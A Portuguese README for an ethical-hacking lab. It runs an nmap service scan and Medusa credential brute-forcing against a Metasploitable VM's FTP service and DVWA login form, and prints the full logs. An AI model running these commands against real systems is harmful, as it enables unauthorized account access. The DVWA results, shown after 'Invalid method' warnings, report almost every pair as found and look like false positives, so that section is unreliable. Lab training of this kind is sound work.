# Kali_Teste

<!-- Utilização do S.O Kali Linux e do Metasploitable para testes de ethical hacking e invasão. -->

##Descrição

Este projeto iremos utilizar ferramentas integradas do Kali Linux para execução de testes de invasão, com o apoio do Metasploitable.
Sendo mostrado passo-a-passo neste documento.

##Indice
1.Pre-requesitos(#pré-requisitos)
2.Configuração do ambiente(#configuração-do-ambiente)
3.Wordlists e arquivos(#wordlists-e-arquivos)
4.Testes realizados(#testes-realizados)
5.Evidências / Logs(#evidências--logs)
6.Mitigações e recomendações(#mitigações-e-recomendações)
7.Estrutura do repositório

## Pré-requisitos

- Oracle Virtual Box (para emulação do Kali Linux e do Metasploitable)
- Download nos sites oficiais de ambas imagens para emulação
- Criação da VM de Kali Linux com o Oracle Virtual Box
- Criação da VM do Metasploitable com o Oracle Virtual Box
- Utilizar as ferrramentas do Kali Linux: (Medusa, nmap, enum4linux)

## Configuração do ambiente

1. Apos download e instalação do Oracle Virtual Box, extrair as .iso's e executar para trazer para a lista de maquinas no Oracle.
2. Configurar a placa de rede das V.M's que foram criadas de NAT para Host-Only (assim elas poderam se enxergar entre si).
3. Iniciar ambas V.M's e testar o comando ifconfig para ver a rede de cada V.M e testar o comando de ping entre elas (ping -c 3 192.168.xxx.xxx) para ver se estão se enxergando.

##Wordlists e arquivos

1. Utilizar a linha de comando para a criação da lista de usuários: (printf "user\nmsfadmin\nadmin\nroot\n" > usuarios.txt)
2. Utilizar a linha de comando para a criação de lista de senhas: (printf "%s\n" "123456" "password" "qwerty" "msfadmin" > senhas.txt)

## Testes realizados

- Efetuamos a varredura das portas no Megasploitable com a ferramenta Nmap no Kali Linux,

  **Utilizando o comando**
  nmap -sV -p 21,22,80,123,445,5900 192.168.56.101

  **Resultado**
  
Nmap scan report for 192.168.56.101
Host is up (0.00020s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4
22/tcp   open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
123/tcp  closed ntp
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
5900/tcp open   vnc         VNC (protocol 3.3)
MAC Address: 08:00:27:CC:E7:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- Agora vamos utilizar a ferramenta Medusa para teste de Brute-Force via FTP (TCP 21)

  **Utilizando o comando**
  medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 10 | tee logs/ftp_medusa.log

  **Resultado**

2025-10-14 23:18:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
2025-10-14 23:18:37 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: password (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: 123456 (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: password (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: qwerty (4 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (1 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (2 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

Notem que na linha 2 deu sucesso ao tentar descobrir o usuario e senha da porta 21.

Abaixo tentaremos acessar o FTP com as credenciais que a Medusa nos forneceu:

ftp 192.168.56.101                                                                                 
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

- Agora iremos utilizar a Medusa para o teste de Brute Force em formulário web (dvwa)

  **Utilizando o comando**

  medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M http \              
  -m PAGE:'/dvwa/login.php' \                                                                     
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6

  **Resultado**

<details> <summary>Trecho do log (linhas com ACCOUNT FOUND)</summary>
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (1 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: qwerty [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (1 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: qwerty [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: 123456 [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: msfadmin (2 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: 123456 [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 6 complete) Password: password (2 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: password [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 7 complete) Password: 123456 (2 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: 123456 [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 8 complete) Password: 123456 (3 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: 123456 [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 9 complete) Password: password (3 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
2025-10-14 23:37:25 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 10 complete) Password: password (4 of 4 complete)
2025-10-14 23:37:25 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]
</details>


















